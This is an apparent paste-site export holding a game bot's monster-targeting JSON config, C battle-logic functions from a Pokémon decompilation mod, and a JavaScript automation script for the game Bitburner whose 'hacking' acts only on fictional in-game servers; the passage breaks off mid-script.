      ""regex"": ""^daily troll$|^daily swamp troll$|^daily island troll$"",
      ""name"": ""daily troll, daily swamp troll, daily island troll"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": true,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 8,
      ""lureMin"": 1,
      ""dynamicLure"": true,
      ""lureDelay"": 320,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^grog$"",
      ""name"": ""grog"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": true,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 6,
      ""lureMin"": 1,
      ""dynamicLure"": true,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^piromanta$"",
      ""name"": ""piromanta"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": true,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^bagienna hydra$"",
      ""name"": ""bagienna hydra"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 8,
      ""lureMin"": 1,
      ""dynamicLure"": true,
      ""dynamicLureDelay"": true,
      ""closeLure"": false,
      ""rePosition"": false,
      ""faceMonster"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""name"": ""kosciany smok"",
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 5,
      ""lureDelay"": 267,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""regex"": ""^kosciany smok$""
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^cylerian$"",
      ""name"": ""cylerian"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": true,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^zle oko$"",
      ""name"": ""zle oko"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^abitanski topornik$"",
      ""name"": ""abitanski topornik"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": true,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^young earth stone$|^young fire stone$|^young ice stone$"",
      ""name"": ""young earth stone, young fire stone, young ice stone"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^earth stone$|^fire stone$|^ice stone$"",
      ""name"": ""earth stone, fire stone, ice stone"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^boruta$|^bekart wojny$|^rokita$"",
      ""name"": ""boruta, bekart wojny, rokita"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^mateo$|^clockwork$|^demoniczny pomiot$"",
      ""name"": ""mateo, clockwork, demoniczny pomiot"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 6,
      ""lureMin"": 2,
      ""dynamicLure"": true,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^risem$"",
      ""name"": ""risem"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": true,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^evil grog$"",
      ""name"": ""evil grog"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": true,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 9,
      ""lureMin"": 1,
      ""delayFrom"": 3,
      ""dynamicLureDelay"": true,
      ""closeLure"": false,
      ""closeLureAmount"": 3,
      ""regex"": ""^kosciany smok$"",
      ""name"": ""kosciany smok"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""dynamicLure"": true,
      ""lureDelay"": 360,
      ""rePosition"": false,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^ancient dragon$"",
      ""name"": ""ancient dragon"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^[farm] fhern$"",
      ""name"": ""[FARM] Fhern"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": true,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^ghazbaran$"",
      ""name"": ""ghazbaran"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^hero$"",
      ""name"": ""hero"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": true,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 7,
      ""lureMin"": 2,
      ""delayFrom"": 6,
      ""lureDelay"": 150,
      ""closeLure"": false,
      ""rePosition"": false,
      ""maxDistance"": 10,
      ""name"": ""Piekielny Ogar"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 4,
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""closeLureAmount"": 3,
      ""dontLoot"": false,
      ""keepDistance"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""lure"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""lureCavebot"": false,
      ""faceMonster"": false,
      ""dynamicLure"": true,
      ""diamondArrows"": false,
      ""dynamicLureDelay"": true,
      ""anchor"": false,
      ""regex"": ""^piekielny ogar$""
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^rokita$"",
      ""name"": ""Rokita"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 4,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": true,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 7,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 120,
      ""closeLure"": true,
      ""closeLureAmount"": 6,
      ""faceMonster"": false,
      ""lureCavebot"": true,
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""name"": ""Ymirson, Hrimtur"",
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 1,
      ""delayFrom"": 4,
      ""dynamicLureDelay"": true,
      ""rePosition"": false,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""regex"": ""^ymirson$|^hrimtur$""
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""closeLureAmount"": 3,
      ""regex"": ""^fardos$"",
      ""name"": ""fardos"",
      ""lureCount"": 1,
      ""danger"": 3,
      ""rePositionAmount"": 5,
      ""anchorRange"": 3,
      ""keepDistanceRange"": 3,
      ""dynamicLureDelay"": false,
      ""rePosition"": false,
      ""keepDistance"": true,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""diamondArrows"": false,
      ""priority"": 2,
      ""rpSafe"": false,
      ""dynamicLure"": false,
      ""faceMonster"": false,
      ""lureCavebot"": false,
      ""lure"": false,
      ""dontLoot"": false,
      ""anchor"": false,
      ""maxDistance"": 10
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLure"": false,
      ""rePosition"": false,
      ""closeLureAmount"": 3,
      ""name"": ""daily toad, daily terror bird"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""lureDelay"": 250,
      ""maxDistance"": 10,
      ""keepDistance"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""lure"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""lureCavebot"": false,
      ""faceMonster"": false,
      ""dynamicLure"": false,
      ""diamondArrows"": false,
      ""dontLoot"": false,
      ""anchor"": false,
      ""regex"": ""^daily toad$|^daily terror bird$""
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLure"": false,
      ""rePosition"": false,
      ""closeLureAmount"": 3,
      ""name"": ""diceros, elite diceros"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""lureDelay"": 250,
      ""maxDistance"": 10,
      ""keepDistance"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""lure"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""lureCavebot"": false,
      ""faceMonster"": false,
      ""dynamicLure"": false,
      ""diamondArrows"": false,
      ""dontLoot"": false,
      ""anchor"": false,
      ""regex"": ""^diceros$|^elite diceros$""
    }
  ]
}"
nwyNSvQg,Cmd_typecalc,Piexplode,C,Saturday 20th of January 2024 02:21:42 PM CDT,"static void Cmd_typecalc(void)
{
    s32 i = 0;
    u8 moveType;

    if (gCurrentMove == MOVE_STRUGGLE)
    {
        gBattlescriptCurrInstr++;
        return;
    }

    GET_MOVE_TYPE(gCurrentMove, moveType);

    // check stab
    if (IS_BATTLER_OF_TYPE(gBattlerAttacker, moveType))
    {
        gBattleMoveDamage = gBattleMoveDamage * 15;
        gBattleMoveDamage = gBattleMoveDamage / 10;
    }

    if (gBattleMons[gBattlerTarget].ability == ABILITY_LEVITATE && moveType == TYPE_GROUND)
    {
        gLastUsedAbility = gBattleMons[gBattlerTarget].ability;
        gMoveResultFlags |= (MOVE_RESULT_MISSED | MOVE_RESULT_DOESNT_AFFECT_FOE);
        gLastLandedMoves[gBattlerTarget] = 0;
        gLastHitByType[gBattlerTarget] = 0;
        gBattleCommunication[MISS_TYPE] = B_MSG_GROUND_MISS;
        RecordAbilityBattle(gBattlerTarget, gLastUsedAbility);
    }
    else
    {
        while (TYPE_EFFECT_ATK_TYPE(i) != TYPE_ENDTABLE)
        {
            if (TYPE_EFFECT_ATK_TYPE(i) == TYPE_FORESIGHT)
            {
                if (gBattleMons[gBattlerTarget].status2 & STATUS2_FORESIGHT)
                    break;
                i += 3;
                continue;
            }
            else if (TYPE_EFFECT_ATK_TYPE(i) == moveType)
            {
                // check type1
                if (TYPE_EFFECT_DEF_TYPE(i) == gBattleMons[gBattlerTarget].type1)
                    ModulateDmgByType(TYPE_EFFECT_MULTIPLIER(i));
                // check type2
                if (TYPE_EFFECT_DEF_TYPE(i) == gBattleMons[gBattlerTarget].type2 &&
                    gBattleMons[gBattlerTarget].type1 != gBattleMons[gBattlerTarget].type2)
                    ModulateDmgByType(TYPE_EFFECT_MULTIPLIER(i));
            }
            i += 3;
        }
    }

    if (gBattleMons[gBattlerTarget].ability == ABILITY_WONDER_GUARD && AttacksThisTurn(gBattlerAttacker, gCurrentMove) == 2
     && (!(gMoveResultFlags & MOVE_RESULT_SUPER_EFFECTIVE) || ((gMoveResultFlags & (MOVE_RESULT_SUPER_EFFECTIVE | MOVE_RESULT_NOT_VERY_EFFECTIVE)) == (MOVE_RESULT_SUPER_EFFECTIVE | MOVE_RESULT_NOT_VERY_EFFECTIVE)))
     && gBattleMoves[gCurrentMove].power)
    {
        gLastUsedAbility = ABILITY_WONDER_GUARD;
        gMoveResultFlags |= MOVE_RESULT_MISSED;
        gLastLandedMoves[gBattlerTarget] = 0;
        gLastHitByType[gBattlerTarget] = 0;
        gBattleCommunication[MISS_TYPE] = B_MSG_AVOIDED_DMG;
        RecordAbilityBattle(gBattlerTarget, gLastUsedAbility);
    }
    if (gMoveResultFlags & MOVE_RESULT_DOESNT_AFFECT_FOE)
        gProtectStructs[gBattlerAttacker].targetNotAffected = 1;

    gBattlescriptCurrInstr++;
}"
p6DyTmzB,Cmd_if_type_effectiveness,Piexplode,C,Saturday 20th of January 2024 02:19:47 PM CDT,"static void Cmd_if_type_effectiveness(void)
{
    u8 damageVar;

    gDynamicBasePower = 0;
    gBattleStruct->dynamicMoveType = 0;
    gBattleScripting.dmgMultiplier = 1;
    gMoveResultFlags = 0;
    gCritMultiplier = 1;

    gBattleMoveDamage = AI_EFFECTIVENESS_x1;
    gCurrentMove = AI_THINKING_STRUCT->moveConsidered;

    // TypeCalc does not assign to gMoveResultFlags, Cmd_typecalc does
    // This makes the check for gMoveResultFlags below always fail
    // This is how you get the ""dual non-immunity"" glitch, where AI 
    // will use ineffective moves on immune pokémon if the second type
    // has a non-neutral, non-immune effectiveness
    // This bug is fixed in this mod
    gMoveResultFlags = TypeCalc(gCurrentMove, sBattler_AI, gBattlerTarget);

    if (gBattleMoveDamage >= 180)
        gBattleMoveDamage = AI_EFFECTIVENESS_x4;
    if (gBattleMoveDamage <= 15)
        gBattleMoveDamage = AI_EFFECTIVENESS_x0_25;
    if (gBattleMoveDamage >= 90)
        gBattleMoveDamage = AI_EFFECTIVENESS_x2;
    if (gBattleMoveDamage <= 30)
        gBattleMoveDamage = AI_EFFECTIVENESS_x0_5;

    if (gMoveResultFlags & MOVE_RESULT_DOESNT_AFFECT_FOE)
        gBattleMoveDamage = AI_EFFECTIVENESS_x0;

    // Store gBattleMoveDamage in a u8 variable because gAIScriptPtr[1] is a u8.
    damageVar = gBattleMoveDamage;

    if (damageVar == gAIScriptPtr[1])
        gAIScriptPtr = T1_READ_PTR(gAIScriptPtr + 2);
    else
        gAIScriptPtr += 6;
}"
LMSTMCSF,'continuous' shotgun batcher,SomeoneCrazy,JavaScript,Saturday 20th of January 2024 02:15:28 PM CDT,"/*
# Automated Hacking Script for NS

This script for NS (NetworkScript) automates hacking activities. It accepts arguments for loop wait time, maximum stack, and a debug flag.

## Features
- **Dynamic Wait Time and Max Stack**: Configures loop wait (`LOOPWAIT`) and max stack (`MAXSTACK`) based on arguments or defaults to 1 and 50, respectively.
- **Debugging**: Includes a debug flag (`DEBUGFLAG`) to toggle verbose logging.
- **Time Tracking**: Measures the total runtime of the script.
- **Colorful Logging**: Uses ANSI escape codes to colorize log messages for better readability.
- **Script Generation**: Automatically creates one-shot scripts for 'hack', 'grow', and 'weaken' if they don't exist.
- **Server Analysis and Selection**:
  - Gathers data on all servers and filters them based on hacking level and other criteria.
  - Sorts and selects targets based on their desirability, calculated by a custom function.
  - Manages controllable servers, including purchased ones, and excludes servers like 'home' and 'hacknet'.
- **Stack Management**: Maintains and updates a stack count for each target server to control the script execution.
- **RAM Management**: Calculates total, free, and used RAM across all controllable servers.
- **Target Prioritization**: Prioritizes servers based on security, available money, and other factors.
- **Adaptive Deployment**:
  - Dynamically calculates the number of threads for hacking, growing, and weakening based on the target server's state.
  - Deploys scripts to the best available server based on RAM availability.
  - Handles deployment failures and adjusts strategies accordingly.
- **Error Handling and Reporting**: Includes checks for errors and unusual conditions, reporting them with color-coded logs.
- **Statistical Output**: Displays various statistics like total runtime, experience gain, income, target server status, and network RAM usage.

## Usage

To use this script, deploy it on an NS server with the desired arguments for:
  - loop wait time, 1 to n in ms), 
  - maximum stack, 1 to n, or depth-limited via '-u',
  - optionally the debug flag '-d'
*/
/** @param {NS} ns */
export async function main(ns) {
  const LOOPWAIT = (typeof ns.args[0] === 'number') ? ns.args[0] : 1; // default
  const MAXSTACK = typeof ns.args[1] === 'number' ? ns.args[1] : 50;  // default to 50
  const WEAKEN_POWER = 0.05;
  const DEBUGFLAG = ns.args.includes('-d');
  
  const DEPLOYCUSHION = 15;

  const START_TIME = Date.now();
  function getTotalRunTime(){return Date.now() - START_TIME;}

  // PRETTY COLORS! (ANSI escape codes for text colorifcation)
  const COLOR_BLACK = ""\u001b[30m""; 
  const COLOR_RED = ""\u001b[31m""; 
  const COLOR_GREEN = ""\u001b[32m""; 
  const COLOR_YELLOW = ""\u001b[33m""; 
  const COLOR_BLUE = ""\u001b[34m""; 
  const COLOR_MAGNETA = ""\u001b[35m""; 
  const COLOR_CYAN = ""\u001b[36m""; 
  const COLOR_WHITE = ""\u001b[37m""; 
  const COLOR_RESET = ""\u001b[0m"";

  // disable SCP logging to make logs useful
  ns.disableLog(""scp"");
  ns.disableLog(""sleep"");
  ns.disableLog(""run"");
  ns.disableLog(""exec"");
  ns.disableLog(""getHackingLevel"");
  ns.disableLog(""scan"");

// Create one-shot hack/grow/weaken scripts, if they are not already in existence.
  const scriptContents1 = `/** @param {NS} ns */
  export async function main(ns) {
    let basicHGWOptions = { additionalMsec: (ns.args[0] ?? 0) };
    await ns.`;
  const scriptContents2 = `(ns.args[1], basicHGWOptions);
  }`
  const oneDoneScripts = [""grow"", ""hack"", ""weaken""]
  for (const type of oneDoneScripts){
    if (!ns.fileExists(`one-${type}.js`)){  
      const scriptContents = `${scriptContents1}${type}${scriptContents2}`;
      ns.write(`one-${type}.js`, scriptContents, ""w""); 
    }
  }

  await ns.sleep(250);
  const HACK_RAM = ns.getScriptRam(""one-hack.js"");
  const GROW_RAM = ns.getScriptRam(""one-grow.js"");
  const WEAKEN_RAM = ns.getScriptRam(""one-weaken.js"");

let targetsandstackcount = [];

// wait about 1 so I can see logs
await ns.sleep(1000 * 1);

// so I can actually see if its looping
let counter = 0;

let totalFreeRam = 0;
let totalMaxRam = 0;

// Main loop
while (true) {
  // Update server data
  let servers = retrieveServerData(ns);

  // hacking level for filtering
  let hackinglevel = ns.getHackingLevel();
  // lets see how many ports we can break, for filtering
  let tools = checkTools();

  // update target list
  let targetservers = servers.filter(server => server.numPortsRequired <= tools && server.requiredLevel <= hackinglevel && server.name !== ""home"" && server.maxMoney != 0);
  // sort by name alphabetically (i think? why did I do this tho?)
  targetservers.sort((a, b) => a.name.localeCompare(b.name));
  
  let purchasedServersList = ns.getPurchasedServers();
  // create / initial update controllable list - what we can crack + purchased servers + home, not hacknet (SPOILERS!)
  let controllableServers = servers.filter(server => {
    (server.numPortsRequired <= tools || purchasedServersList.includes(server.name)) && !server.name.includes(""hacknet"")
  });

  //controllableServers = controllableServers.filter((server) => { server.name != ""home"" });
  
  // check for new targets
  for (let target of targetservers) {
    // any new targets on the list?
    if (!targetsandstackcount.some(entry => entry[0] === target.name)) {
      targetsandstackcount.push([target.name, 0, []]);
    }
  }

  // update target stack data
  for (let targetEntry of targetsandstackcount) {
    // Get the PID array for the current target
    let pidArray = targetEntry[2];
    // If PID array is EMPTY for a target, ensure its stack count to zero
    if (pidArray.length === 0) {
      targetEntry[1] = 0;
      continue;
    }
    // Use a reverse for loop to iterate over the array safely
    for (let i = pidArray.length - 1; i >= 0; i--) {
      if (!ns.isRunning(pidArray[i])) {
        // Remove the dead PID's from the array
        pidArray.splice(i, 1);
        // Decrement the stack count for the target
        targetEntry[1]--;
      }
    }
  }

  let targetsAtMaxStack = 0;
  let whileerrorflag = false;
  let excessDelay = false;
  let runtimeTooLong = false;

  // reset ram values for calculation before deploy
  totalFreeRam = 0;
  totalMaxRam = 0;

  // get totals
  for (let controllable of controllableServers){
    totalFreeRam += controllable.freeRam;
    totalMaxRam += controllable.maxRam;
  }

  let serversWithWeights = [];
  for (const target of targetservers){
    let targetDesirability = await getDesirability(ns, target.name)
    serversWithWeights.push({target:target, weight:targetDesirability})
  }

  serversWithWeights.sort((a,b) => { return b.weight - a.weight })

  let optimalTargetByWeight = serversWithWeights[0];

  for (let target of targetservers){
